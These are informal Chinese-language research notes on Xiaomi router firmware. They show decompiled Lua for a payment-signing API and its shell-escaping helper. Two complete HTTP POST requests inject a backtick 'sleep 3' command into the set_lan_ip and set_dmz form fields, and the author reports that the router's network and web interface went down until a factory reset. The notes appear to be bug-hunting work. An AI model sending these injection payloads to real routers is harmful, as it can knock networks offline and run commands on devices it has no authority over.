emm，还是应该先找Binary的命令注入，再往lua反推，直接从lua找好多都不行。。。



# xqsystem

## signOrder

可惜了，这里如果能得到sid的话，大概率是有个命令注入的。

😔。呃，但有个_cmdformat，引号逃逸不了。。。/(ㄒoㄒ)/~~

```lua
function L4()
    -- 加载必要模块
    local XQFunction = require("xiaoqiang.common.XQFunction")
    local luci_util = require("luci.util")
    local uci = require("luci.model.uci").cursor()

    -- 从表单中获取参数
    local sid = _UPVALUE0_.formvalue("sid")
    local digest = _UPVALUE0_.formvalue("digest")

    -- 构建响应表
    local response = { code = 0 }

    -- 检查 `sid` 和 `digest` 是否为空
    if XQFunction.isStrNil(sid) or XQFunction.isStrNil(digest) then
        response.code = 1523  -- 参数无效错误码
        goto finalize
    end

    -- 从 `uci` 配置中获取 key
    local key = uci:get("mipayment", sid, "key")
    if XQFunction.isStrNil(key) then
        response.code = 1636  -- 无法找到密钥错误码
    else
        -- 构建签名命令
        local cmd = string.format(
            "matool --method signOrder --params \"%s\" \"%s\"",
            XQFunction._cmdformat(key),
            XQFunction._cmdformat(digest)
        )

        -- 执行命令并获取签名结果
        local signature = luci_util.trim(luci_util.exec(cmd))
        response.signature = signature
    end

    ::finalize::

    -- 如果有错误，添加错误信息
    if response.code ~= 0 then
        response.msg = _UPVALUE1_.getErrorMessage(response.code)
    end

    -- 输出 JSON 格式的响应
    _UPVALUE0_.write_json(response)
end

-- 将函数绑定到变量
signOrder = L4

```





_cmdformat：

```lua
function L1(A0)
  local L1, L2, L3, L4
  L1 = isStrNil
  L2 = A0
  L1 = L1(L2)
  if L1 then
    L1 = ""
    return L1
  else
    L2 = A0
    L1 = A0.gsub
    L3 = "\\"
    L4 = "\\\\"
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "`"
    L4 = "\\`"
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "\""
    L4 = "\\\""
    L1 = L1(L2, L3, L4)
    L2 = L1
    L1 = L1.gsub
    L3 = "%$"
    L4 = "\\$"
    L1 = L1(L2, L3, L4)
    return L1
  end
end
_cmdformat = L1
```





# xqnetwork

## setLanIp

一眼看到对mac参数没有校验。。。

嘶，传了个这个POST：

```
POST /cgi-bin/luci/;stok=04ff237766870b2bfcec60a6bd2c50e5/api/xqnetwork/set_lan_ip HTTP/1.1
Host: 192.168.31.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.31.1/cgi-bin/luci/;stok=04ff237766870b2bfcec60a6bd2c50e5/web/setting/wifi
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: __guid=86847064.2712971008854404600.1735352234182.2537; monitor_count=26; psp=admin|||2|||0
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 49

ip=192.168.31.2&mask=255.255.255.0;%0a`sleep%203`
```



然后网就会断掉，然后web界面也登不进去了。？？？

这算是一种奇奇怪怪的DoS吧。。 甚至有可能命令是执行了的？但web界面挂了啊。。。重启？

呃，那应该其它小米路由器也有这个问题？？？



## set_dmz

虽说打的是 AX1800的。。。

```
POST /cgi-bin/luci/;stok=94335b2e8f051dac13ad042977816b47/api/xqnetwork/set_dmz HTTP/1.1
Host: 192.168.31.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Referer: http://192.168.31.1/cgi-bin/luci/web
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Cookie: __guid=86847064.2712971008854404600.1735352234182.2537; monitor_count=29; psp=admin|||2|||0
Upgrade-Insecure-Requests: 1
Priority: u=1
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

ip=192.168.31.2;%0a`sleep%203`
```

又挂了？？？

绷。。。 重启也没用。 只能reset了。。。

这种能算DoS？？？ emmm。。。反正可以交。。。

但第二次打没复现成功？？？

以后先备份一个数据。。。方便恢复。。。



那感觉有set的地方都可能有这种奇怪的漏洞？？？

